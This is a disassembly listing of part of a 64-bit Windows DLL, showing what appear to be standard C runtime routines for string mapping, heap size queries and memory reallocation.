   18000bd40:	06                   	(bad)
   18000bd41:	bc 00 00 0d bc       	mov    $0xbc0d0000,%esp
   18000bd46:	00 00                	add    %al,(%rax)
   18000bd48:	14 bc                	adc    $0xbc,%al
   18000bd4a:	00 00                	add    %al,(%rax)
   18000bd4c:	1b bc 00 00 22 bc 00 	sbb    0xbc2200(%rax,%rax,1),%edi
   18000bd53:	00 29                	add    %ch,(%rcx)
   18000bd55:	bc 00 00 30 bc       	mov    $0xbc300000,%esp
   18000bd5a:	00 00                	add    %al,(%rax)
   18000bd5c:	37                   	(bad)
   18000bd5d:	bc 00 00 3e bc       	mov    $0xbc3e0000,%esp
   18000bd62:	00 00                	add    %al,(%rax)
   18000bd64:	45 bc 00 00 45 33    	rex.RB mov $0x33450000,%r12d
   18000bd6a:	c0 e9 00             	shr    $0x0,%cl
   18000bd6d:	00 00                	add    %al,(%rax)
   18000bd6f:	00 48 89             	add    %cl,-0x77(%rax)
   18000bd72:	5c                   	pop    %rsp
   18000bd73:	24 08                	and    $0x8,%al
   18000bd75:	57                   	push   %rdi
   18000bd76:	48 83 ec 40          	sub    $0x40,%rsp
   18000bd7a:	48 8b da             	mov    %rdx,%rbx
   18000bd7d:	48 8b f9             	mov    %rcx,%rdi
   18000bd80:	48 85 c9             	test   %rcx,%rcx
   18000bd83:	75 14                	jne    0x18000bd99
   18000bd85:	e8 72 c4 ff ff       	call   0x1800081fc
   18000bd8a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000bd90:	e8 a7 a8 ff ff       	call   0x18000663c
   18000bd95:	33 c0                	xor    %eax,%eax
   18000bd97:	eb 60                	jmp    0x18000bdf9
   18000bd99:	48 85 db             	test   %rbx,%rbx
   18000bd9c:	74 e7                	je     0x18000bd85
   18000bd9e:	48 3b fb             	cmp    %rbx,%rdi
   18000bda1:	73 f2                	jae    0x18000bd95
   18000bda3:	49 8b d0             	mov    %r8,%rdx
   18000bda6:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000bdab:	e8 e4 ba ff ff       	call   0x180007894
   18000bdb0:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   18000bdb5:	48 8d 53 ff          	lea    -0x1(%rbx),%rdx
   18000bdb9:	83 79 08 00          	cmpl   $0x0,0x8(%rcx)
   18000bdbd:	74 24                	je     0x18000bde3
   18000bdbf:	48 ff ca             	dec    %rdx
   18000bdc2:	48 3b fa             	cmp    %rdx,%rdi
   18000bdc5:	77 0a                	ja     0x18000bdd1
   18000bdc7:	0f b6 02             	movzbl (%rdx),%eax
   18000bdca:	f6 44 08 19 04       	testb  $0x4,0x19(%rax,%rcx,1)
   18000bdcf:	75 ee                	jne    0x18000bdbf
   18000bdd1:	48 8b cb             	mov    %rbx,%rcx
   18000bdd4:	48 2b ca             	sub    %rdx,%rcx
   18000bdd7:	48 8b d3             	mov    %rbx,%rdx
   18000bdda:	83 e1 01             	and    $0x1,%ecx
   18000bddd:	48 2b d1             	sub    %rcx,%rdx
   18000bde0:	48 ff ca             	dec    %rdx
   18000bde3:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   18000bde8:	74 0c                	je     0x18000bdf6
   18000bdea:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   18000bdef:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   18000bdf6:	48 8b c2             	mov    %rdx,%rax
   18000bdf9:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000bdfe:	48 83 c4 40          	add    $0x40,%rsp
   18000be02:	5f                   	pop    %rdi
   18000be03:	c3                   	ret
   18000be04:	40 55                	rex push %rbp
   18000be06:	41 54                	push   %r12
   18000be08:	41 55                	push   %r13
   18000be0a:	41 56                	push   %r14
   18000be0c:	41 57                	push   %r15
   18000be0e:	48 83 ec 60          	sub    $0x60,%rsp
   18000be12:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   18000be17:	48 89 5d 60          	mov    %rbx,0x60(%rbp)
   18000be1b:	48 89 75 68          	mov    %rsi,0x68(%rbp)
   18000be1f:	48 89 7d 70          	mov    %rdi,0x70(%rbp)
   18000be23:	48 8b 05 e6 e1 00 00 	mov    0xe1e6(%rip),%rax        # 0x18001a010
   18000be2a:	48 33 c5             	xor    %rbp,%rax
   18000be2d:	48 89 45 20          	mov    %rax,0x20(%rbp)
   18000be31:	44 8b ea             	mov    %edx,%r13d
   18000be34:	45 8b f9             	mov    %r9d,%r15d
   18000be37:	48 8b d1             	mov    %rcx,%rdx
   18000be3a:	4d 8b e0             	mov    %r8,%r12
   18000be3d:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   18000be41:	e8 4e ba ff ff       	call   0x180007894
   18000be46:	8b bd 88 00 00 00    	mov    0x88(%rbp),%edi
   18000be4c:	85 ff                	test   %edi,%edi
   18000be4e:	75 07                	jne    0x18000be57
   18000be50:	48 8b 45 08          	mov    0x8(%rbp),%rax
   18000be54:	8b 78 0c             	mov    0xc(%rax),%edi
   18000be57:	f7 9d 90 00 00 00    	negl   0x90(%rbp)
   18000be5d:	45 8b cf             	mov    %r15d,%r9d
   18000be60:	4d 8b c4             	mov    %r12,%r8
   18000be63:	8b cf                	mov    %edi,%ecx
   18000be65:	1b d2                	sbb    %edx,%edx
   18000be67:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   18000be6c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000be72:	83 e2 08             	and    $0x8,%edx
   18000be75:	ff c2                	inc    %edx
   18000be77:	e8 64 db ff ff       	call   0x1800099e0
   18000be7c:	4c 63 f0             	movslq %eax,%r14
   18000be7f:	85 c0                	test   %eax,%eax
   18000be81:	75 07                	jne    0x18000be8a
   18000be83:	33 ff                	xor    %edi,%edi
   18000be85:	e9 ce 00 00 00       	jmp    0x18000bf58
   18000be8a:	49 8b f6             	mov    %r14,%rsi
   18000be8d:	48 03 f6             	add    %rsi,%rsi
   18000be90:	48 8d 46 10          	lea    0x10(%rsi),%rax
   18000be94:	48 3b f0             	cmp    %rax,%rsi
   18000be97:	48 1b c9             	sbb    %rcx,%rcx
   18000be9a:	48 23 c8             	and    %rax,%rcx
   18000be9d:	74 53                	je     0x18000bef2
   18000be9f:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   18000bea6:	77 31                	ja     0x18000bed9
   18000bea8:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   18000beac:	48 3b c1             	cmp    %rcx,%rax
   18000beaf:	77 0a                	ja     0x18000bebb
   18000beb1:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   18000beb8:	ff ff 0f 
   18000bebb:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   18000bebf:	e8 ac 33 00 00       	call   0x18000f270
   18000bec4:	48 2b e0             	sub    %rax,%rsp
   18000bec7:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   18000becc:	48 85 db             	test   %rbx,%rbx
   18000becf:	74 6f                	je     0x18000bf40
   18000bed1:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   18000bed7:	eb 13                	jmp    0x18000beec
   18000bed9:	e8 3a ee ff ff       	call   0x18000ad18
   18000bede:	48 8b d8             	mov    %rax,%rbx
   18000bee1:	48 85 c0             	test   %rax,%rax
   18000bee4:	74 0e                	je     0x18000bef4
   18000bee6:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   18000beec:	48 83 c3 10          	add    $0x10,%rbx
   18000bef0:	eb 02                	jmp    0x18000bef4
   18000bef2:	33 db                	xor    %ebx,%ebx
   18000bef4:	48 85 db             	test   %rbx,%rbx
   18000bef7:	74 47                	je     0x18000bf40
   18000bef9:	4c 8b c6             	mov    %rsi,%r8
   18000befc:	33 d2                	xor    %edx,%edx
   18000befe:	48 8b cb             	mov    %rbx,%rcx
   18000bf01:	e8 7a 77 ff ff       	call   0x180003680
   18000bf06:	45 8b cf             	mov    %r15d,%r9d
   18000bf09:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   18000bf0e:	4d 8b c4             	mov    %r12,%r8
   18000bf11:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000bf16:	ba 01 00 00 00       	mov    $0x1,%edx
   18000bf1b:	8b cf                	mov    %edi,%ecx
   18000bf1d:	e8 be da ff ff       	call   0x1800099e0
   18000bf22:	85 c0                	test   %eax,%eax
   18000bf24:	74 1a                	je     0x18000bf40
   18000bf26:	4c 8b 8d 80 00 00 00 	mov    0x80(%rbp),%r9
   18000bf2d:	44 8b c0             	mov    %eax,%r8d
   18000bf30:	48 8b d3             	mov    %rbx,%rdx
   18000bf33:	41 8b cd             	mov    %r13d,%ecx
   18000bf36:	ff 15 a4 42 00 00    	call   *0x42a4(%rip)        # 0x1800101e0
   18000bf3c:	8b f8                	mov    %eax,%edi
   18000bf3e:	eb 02                	jmp    0x18000bf42
   18000bf40:	33 ff                	xor    %edi,%edi
   18000bf42:	48 85 db             	test   %rbx,%rbx
   18000bf45:	74 11                	je     0x18000bf58
   18000bf47:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   18000bf4b:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   18000bf51:	75 05                	jne    0x18000bf58
   18000bf53:	e8 3c c3 ff ff       	call   0x180008294
   18000bf58:	80 7d 18 00          	cmpb   $0x0,0x18(%rbp)
   18000bf5c:	74 0b                	je     0x18000bf69
   18000bf5e:	48 8b 45 00          	mov    0x0(%rbp),%rax
   18000bf62:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   18000bf69:	8b c7                	mov    %edi,%eax
   18000bf6b:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   18000bf6f:	48 33 cd             	xor    %rbp,%rcx
   18000bf72:	e8 49 5b ff ff       	call   0x180001ac0
   18000bf77:	48 8b 5d 60          	mov    0x60(%rbp),%rbx
   18000bf7b:	48 8b 75 68          	mov    0x68(%rbp),%rsi
   18000bf7f:	48 8b 7d 70          	mov    0x70(%rbp),%rdi
   18000bf83:	48 8d 65 30          	lea    0x30(%rbp),%rsp
   18000bf87:	41 5f                	pop    %r15
   18000bf89:	41 5e                	pop    %r14
   18000bf8b:	41 5d                	pop    %r13
   18000bf8d:	41 5c                	pop    %r12
   18000bf8f:	5d                   	pop    %rbp
   18000bf90:	c3                   	ret
   18000bf91:	cc                   	int3
   18000bf92:	cc                   	int3
   18000bf93:	cc                   	int3
   18000bf94:	40 55                	rex push %rbp
   18000bf96:	41 54                	push   %r12
   18000bf98:	41 55                	push   %r13
   18000bf9a:	41 56                	push   %r14
   18000bf9c:	41 57                	push   %r15
   18000bf9e:	48 83 ec 60          	sub    $0x60,%rsp
   18000bfa2:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   18000bfa7:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   18000bfab:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   18000bfaf:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   18000bfb3:	48 8b 05 56 e0 00 00 	mov    0xe056(%rip),%rax        # 0x18001a010
   18000bfba:	48 33 c5             	xor    %rbp,%rax
   18000bfbd:	48 89 45 08          	mov    %rax,0x8(%rbp)
   18000bfc1:	48 63 5d 60          	movslq 0x60(%rbp),%rbx
   18000bfc5:	4d 8b f9             	mov    %r9,%r15
   18000bfc8:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   18000bfcc:	45 8b e8             	mov    %r8d,%r13d
   18000bfcf:	48 8b f9             	mov    %rcx,%rdi
   18000bfd2:	85 db                	test   %ebx,%ebx
   18000bfd4:	7e 14                	jle    0x18000bfea
   18000bfd6:	48 8b d3             	mov    %rbx,%rdx
   18000bfd9:	49 8b c9             	mov    %r9,%rcx
   18000bfdc:	e8 9f 1b 00 00       	call   0x18000db80
   18000bfe1:	3b c3                	cmp    %ebx,%eax
   18000bfe3:	8d 58 01             	lea    0x1(%rax),%ebx
   18000bfe6:	7c 02                	jl     0x18000bfea
   18000bfe8:	8b d8                	mov    %eax,%ebx
   18000bfea:	44 8b 75 78          	mov    0x78(%rbp),%r14d
   18000bfee:	45 85 f6             	test   %r14d,%r14d
   18000bff1:	75 07                	jne    0x18000bffa
   18000bff3:	48 8b 07             	mov    (%rdi),%rax
   18000bff6:	44 8b 70 0c          	mov    0xc(%rax),%r14d
   18000bffa:	f7 9d 80 00 00 00    	negl   0x80(%rbp)
   18000c000:	44 8b cb             	mov    %ebx,%r9d
   18000c003:	4d 8b c7             	mov    %r15,%r8
   18000c006:	41 8b ce             	mov    %r14d,%ecx
   18000c009:	1b d2                	sbb    %edx,%edx
   18000c00b:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   18000c010:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000c016:	83 e2 08             	and    $0x8,%edx
   18000c019:	ff c2                	inc    %edx
   18000c01b:	e8 c0 d9 ff ff       	call   0x1800099e0
   18000c020:	4c 63 e0             	movslq %eax,%r12
   18000c023:	85 c0                	test   %eax,%eax
   18000c025:	0f 84 36 02 00 00    	je     0x18000c261
   18000c02b:	49 8b c4             	mov    %r12,%rax
   18000c02e:	49 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%r8
   18000c035:	ff ff 0f 
   18000c038:	48 03 c0             	add    %rax,%rax
   18000c03b:	48 8d 48 10          	lea    0x10(%rax),%rcx
   18000c03f:	48 3b c1             	cmp    %rcx,%rax
   18000c042:	48 1b d2             	sbb    %rdx,%rdx
   18000c045:	48 23 d1             	and    %rcx,%rdx
   18000c048:	74 53                	je     0x18000c09d
   18000c04a:	48 81 fa 00 04 00 00 	cmp    $0x400,%rdx
   18000c051:	77 2e                	ja     0x18000c081
   18000c053:	48 8d 42 0f          	lea    0xf(%rdx),%rax
   18000c057:	48 3b c2             	cmp    %rdx,%rax
   18000c05a:	77 03                	ja     0x18000c05f
   18000c05c:	49 8b c0             	mov    %r8,%rax
   18000c05f:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   18000c063:	e8 08 32 00 00       	call   0x18000f270
   18000c068:	48 2b e0             	sub    %rax,%rsp
   18000c06b:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
   18000c070:	48 85 f6             	test   %rsi,%rsi
   18000c073:	0f 84 ce 01 00 00    	je     0x18000c247
   18000c079:	c7 06 cc cc 00 00    	movl   $0xcccc,(%rsi)
   18000c07f:	eb 16                	jmp    0x18000c097
   18000c081:	48 8b ca             	mov    %rdx,%rcx
   18000c084:	e8 8f ec ff ff       	call   0x18000ad18
   18000c089:	48 8b f0             	mov    %rax,%rsi
   18000c08c:	48 85 c0             	test   %rax,%rax
   18000c08f:	74 0e                	je     0x18000c09f
   18000c091:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   18000c097:	48 83 c6 10          	add    $0x10,%rsi
   18000c09b:	eb 02                	jmp    0x18000c09f
   18000c09d:	33 f6                	xor    %esi,%esi
   18000c09f:	48 85 f6             	test   %rsi,%rsi
   18000c0a2:	0f 84 9f 01 00 00    	je     0x18000c247
   18000c0a8:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   18000c0ad:	44 8b cb             	mov    %ebx,%r9d
   18000c0b0:	4d 8b c7             	mov    %r15,%r8
   18000c0b3:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   18000c0b8:	ba 01 00 00 00       	mov    $0x1,%edx
   18000c0bd:	41 8b ce             	mov    %r14d,%ecx
   18000c0c0:	e8 1b d9 ff ff       	call   0x1800099e0
   18000c0c5:	85 c0                	test   %eax,%eax
   18000c0c7:	0f 84 7a 01 00 00    	je     0x18000c247
   18000c0cd:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   18000c0d3:	45 8b cc             	mov    %r12d,%r9d
   18000c0d6:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   18000c0dc:	4c 8b c6             	mov    %rsi,%r8
   18000c0df:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   18000c0e5:	41 8b d5             	mov    %r13d,%edx
   18000c0e8:	4c 8b 7d 00          	mov    0x0(%rbp),%r15
   18000c0ec:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   18000c0f1:	49 8b cf             	mov    %r15,%rcx
   18000c0f4:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000c0fa:	e8 7d df ff ff       	call   0x18000a07c
   18000c0ff:	48 63 f8             	movslq %eax,%rdi
   18000c102:	85 c0                	test   %eax,%eax
   18000c104:	0f 84 3d 01 00 00    	je     0x18000c247
   18000c10a:	ba 00 04 00 00       	mov    $0x400,%edx
   18000c10f:	44 85 ea             	test   %r13d,%edx
   18000c112:	74 52                	je     0x18000c166
   18000c114:	8b 45 70             	mov    0x70(%rbp),%eax
   18000c117:	85 c0                	test   %eax,%eax
   18000c119:	0f 84 2a 01 00 00    	je     0x18000c249
   18000c11f:	3b f8                	cmp    %eax,%edi
   18000c121:	0f 8f 20 01 00 00    	jg     0x18000c247
   18000c127:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   18000c12d:	45 8b cc             	mov    %r12d,%r9d
   18000c130:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   18000c136:	4c 8b c6             	mov    %rsi,%r8
   18000c139:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   18000c13f:	41 8b d5             	mov    %r13d,%edx
   18000c142:	89 44 24 28          	mov    %eax,0x28(%rsp)
   18000c146:	49 8b cf             	mov    %r15,%rcx
   18000c149:	48 8b 45 68          	mov    0x68(%rbp),%rax
   18000c14d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000c152:	e8 25 df ff ff       	call   0x18000a07c
   18000c157:	8b f8                	mov    %eax,%edi
   18000c159:	85 c0                	test   %eax,%eax
   18000c15b:	0f 85 e8 00 00 00    	jne    0x18000c249
   18000c161:	e9 e1 00 00 00       	jmp    0x18000c247
   18000c166:	48 8b cf             	mov    %rdi,%rcx
   18000c169:	48 03 c9             	add    %rcx,%rcx
   18000c16c:	48 8d 41 10          	lea    0x10(%rcx),%rax
   18000c170:	48 3b c8             	cmp    %rax,%rcx
   18000c173:	48 1b c9             	sbb    %rcx,%rcx
   18000c176:	48 23 c8             	and    %rax,%rcx
   18000c179:	74 53                	je     0x18000c1ce
   18000c17b:	48 3b ca             	cmp    %rdx,%rcx
   18000c17e:	77 35                	ja     0x18000c1b5
   18000c180:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   18000c184:	48 3b c1             	cmp    %rcx,%rax
   18000c187:	77 0a                	ja     0x18000c193
   18000c189:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   18000c190:	ff ff 0f 
   18000c193:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   18000c197:	e8 d4 30 00 00       	call   0x18000f270
   18000c19c:	48 2b e0             	sub    %rax,%rsp
   18000c19f:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   18000c1a4:	48 85 db             	test   %rbx,%rbx
   18000c1a7:	0f 84 9a 00 00 00    	je     0x18000c247
   18000c1ad:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   18000c1b3:	eb 13                	jmp    0x18000c1c8
   18000c1b5:	e8 5e eb ff ff       	call   0x18000ad18
   18000c1ba:	48 8b d8             	mov    %rax,%rbx
   18000c1bd:	48 85 c0             	test   %rax,%rax
   18000c1c0:	74 0e                	je     0x18000c1d0
   18000c1c2:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   18000c1c8:	48 83 c3 10          	add    $0x10,%rbx
   18000c1cc:	eb 02                	jmp    0x18000c1d0
   18000c1ce:	33 db                	xor    %ebx,%ebx
   18000c1d0:	48 85 db             	test   %rbx,%rbx
   18000c1d3:	74 72                	je     0x18000c247
   18000c1d5:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   18000c1db:	45 8b cc             	mov    %r12d,%r9d
   18000c1de:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   18000c1e4:	4c 8b c6             	mov    %rsi,%r8
   18000c1e7:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   18000c1ed:	41 8b d5             	mov    %r13d,%edx
   18000c1f0:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   18000c1f4:	49 8b cf             	mov    %r15,%rcx
   18000c1f7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000c1fc:	e8 7b de ff ff       	call   0x18000a07c
   18000c201:	85 c0                	test   %eax,%eax
   18000c203:	74 31                	je     0x18000c236
   18000c205:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   18000c20b:	33 d2                	xor    %edx,%edx
   18000c20d:	48 21 54 24 30       	and    %rdx,0x30(%rsp)
   18000c212:	44 8b cf             	mov    %edi,%r9d
   18000c215:	8b 45 70             	mov    0x70(%rbp),%eax
   18000c218:	4c 8b c3             	mov    %rbx,%r8
   18000c21b:	41 8b ce             	mov    %r14d,%ecx
   18000c21e:	85 c0                	test   %eax,%eax
   18000c220:	75 65                	jne    0x18000c287
   18000c222:	21 54 24 28          	and    %edx,0x28(%rsp)
   18000c226:	48 21 54 24 20       	and    %rdx,0x20(%rsp)
   18000c22b:	e8 0c d8 ff ff       	call   0x180009a3c
   18000c230:	8b f8                	mov    %eax,%edi
   18000c232:	85 c0                	test   %eax,%eax
   18000c234:	75 60                	jne    0x18000c296
   18000c236:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   18000c23a:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   18000c240:	75 05                	jne    0x18000c247
   18000c242:	e8 4d c0 ff ff       	call   0x180008294
   18000c247:	33 ff                	xor    %edi,%edi
   18000c249:	48 85 f6             	test   %rsi,%rsi
   18000c24c:	74 11                	je     0x18000c25f
   18000c24e:	48 8d 4e f0          	lea    -0x10(%rsi),%rcx
   18000c252:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   18000c258:	75 05                	jne    0x18000c25f
   18000c25a:	e8 35 c0 ff ff       	call   0x180008294
   18000c25f:	8b c7                	mov    %edi,%eax
   18000c261:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   18000c265:	48 33 cd             	xor    %rbp,%rcx
   18000c268:	e8 53 58 ff ff       	call   0x180001ac0
   18000c26d:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   18000c271:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   18000c275:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   18000c279:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   18000c27d:	41 5f                	pop    %r15
   18000c27f:	41 5e                	pop    %r14
   18000c281:	41 5d                	pop    %r13
   18000c283:	41 5c                	pop    %r12
   18000c285:	5d                   	pop    %rbp
   18000c286:	c3                   	ret
   18000c287:	89 44 24 28          	mov    %eax,0x28(%rsp)
   18000c28b:	48 8b 45 68          	mov    0x68(%rbp),%rax
   18000c28f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000c294:	eb 95                	jmp    0x18000c22b
   18000c296:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   18000c29a:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   18000c2a0:	75 a7                	jne    0x18000c249
   18000c2a2:	e8 ed bf ff ff       	call   0x180008294
   18000c2a7:	eb a0                	jmp    0x18000c249
   18000c2a9:	cc                   	int3
   18000c2aa:	cc                   	int3
   18000c2ab:	cc                   	int3
   18000c2ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000c2b1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000c2b6:	57                   	push   %rdi
   18000c2b7:	48 83 ec 70          	sub    $0x70,%rsp
   18000c2bb:	48 8b f2             	mov    %rdx,%rsi
   18000c2be:	49 8b d9             	mov    %r9,%rbx
   18000c2c1:	48 8b d1             	mov    %rcx,%rdx
   18000c2c4:	41 8b f8             	mov    %r8d,%edi
   18000c2c7:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   18000c2cc:	e8 c3 b5 ff ff       	call   0x180007894
   18000c2d1:	8b 84 24 c0 00 00 00 	mov    0xc0(%rsp),%eax
   18000c2d8:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   18000c2dd:	89 44 24 40          	mov    %eax,0x40(%rsp)
   18000c2e1:	4c 8b cb             	mov    %rbx,%r9
   18000c2e4:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   18000c2eb:	44 8b c7             	mov    %edi,%r8d
   18000c2ee:	89 44 24 38          	mov    %eax,0x38(%rsp)
   18000c2f2:	48 8b d6             	mov    %rsi,%rdx
   18000c2f5:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   18000c2fc:	89 44 24 30          	mov    %eax,0x30(%rsp)
   18000c300:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   18000c307:	00 
   18000c308:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000c30d:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   18000c314:	89 44 24 20          	mov    %eax,0x20(%rsp)
   18000c318:	e8 77 fc ff ff       	call   0x18000bf94
   18000c31d:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   18000c322:	74 0c                	je     0x18000c330
   18000c324:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   18000c329:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   18000c330:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   18000c335:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   18000c339:	49 8b 73 18          	mov    0x18(%r11),%rsi
   18000c33d:	49 8b e3             	mov    %r11,%rsp
   18000c340:	5f                   	pop    %rdi
   18000c341:	c3                   	ret
   18000c342:	cc                   	int3
   18000c343:	cc                   	int3
   18000c344:	48 83 ec 28          	sub    $0x28,%rsp
   18000c348:	e8 a7 d2 ff ff       	call   0x1800095f4
   18000c34d:	33 c9                	xor    %ecx,%ecx
   18000c34f:	84 c0                	test   %al,%al
   18000c351:	0f 94 c1             	sete   %cl
   18000c354:	8b c1                	mov    %ecx,%eax
   18000c356:	48 83 c4 28          	add    $0x28,%rsp
   18000c35a:	c3                   	ret
   18000c35b:	cc                   	int3
   18000c35c:	48 83 ec 28          	sub    $0x28,%rsp
   18000c360:	48 85 c9             	test   %rcx,%rcx
   18000c363:	75 19                	jne    0x18000c37e
   18000c365:	e8 92 be ff ff       	call   0x1800081fc
   18000c36a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000c370:	e8 c7 a2 ff ff       	call   0x18000663c
   18000c375:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   18000c379:	48 83 c4 28          	add    $0x28,%rsp
   18000c37d:	c3                   	ret
   18000c37e:	4c 8b c1             	mov    %rcx,%r8
   18000c381:	33 d2                	xor    %edx,%edx
   18000c383:	48 8b 0d 96 f4 00 00 	mov    0xf496(%rip),%rcx        # 0x18001b820
   18000c38a:	48 83 c4 28          	add    $0x28,%rsp
   18000c38e:	48 ff 25 53 3e 00 00 	rex.W jmp *0x3e53(%rip)        # 0x1800101e8
   18000c395:	cc                   	int3
   18000c396:	cc                   	int3
   18000c397:	cc                   	int3
   18000c398:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000c39d:	57                   	push   %rdi
   18000c39e:	48 83 ec 20          	sub    $0x20,%rsp
   18000c3a2:	48 8b da             	mov    %rdx,%rbx
   18000c3a5:	48 8b f9             	mov    %rcx,%rdi
   18000c3a8:	48 85 c9             	test   %rcx,%rcx
   18000c3ab:	75 0a                	jne    0x18000c3b7
   18000c3ad:	48 8b ca             	mov    %rdx,%rcx
   18000c3b0:	e8 63 e9 ff ff       	call   0x18000ad18
   18000c3b5:	eb 1f                	jmp    0x18000c3d6
   18000c3b7:	48 85 db             	test   %rbx,%rbx
   18000c3ba:	75 07                	jne    0x18000c3c3
   18000c3bc:	e8 d3 be ff ff       	call   0x180008294
   18000c3c1:	eb 11                	jmp    0x18000c3d4
   18000c3c3:	48 83 fb e0          	cmp    $0xffffffffffffffe0,%rbx
   18000c3c7:	76 2d                	jbe    0x18000c3f6
   18000c3c9:	e8 2e be ff ff       	call   0x1800081fc
   18000c3ce:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   18000c3d4:	33 c0                	xor    %eax,%eax
   18000c3d6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000c3db:	48 83 c4 20          	add    $0x20,%rsp
   18000c3df:	5f                   	pop    %rdi
   18000c3e0:	c3                   	ret
   18000c3e1:	e8 92 f0 ff ff       	call   0x18000b478
   18000c3e6:	85 c0                	test   %eax,%eax
   18000c3e8:	74 df                	je     0x18000c3c9
   18000c3ea:	48 8b cb             	mov    %rbx,%rcx
   18000c3ed:	e8 9e b2 ff ff       	call   0x180007690
   18000c3f2:	85 c0                	test   %eax,%eax
   18000c3f4:	74 d3                	je     0x18000c3c9
   18000c3f6:	48 8b 0d 23 f4 00 00 	mov    0xf423(%rip),%rcx        # 0x18001b820
   18000c3fd:	4c 8b cb             	mov    %rbx,%r9
   18000c400:	4c 8b c7             	mov    %rdi,%r8
   18000c403:	33 d2                	xor    %edx,%edx
   18000c405:	ff 15 e5 3d 00 00    	call   *0x3de5(%rip)        # 0x1800101f0
   18000c40b:	48 85 c0             	test   %rax,%rax
   18000c40e:	74 d1                	je     0x18000c3e1
   18000c410:	eb c4                	jmp    0x18000c3d6
   18000c412:	cc                   	int3
   18000c413:	cc                   	int3
   18000c414:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
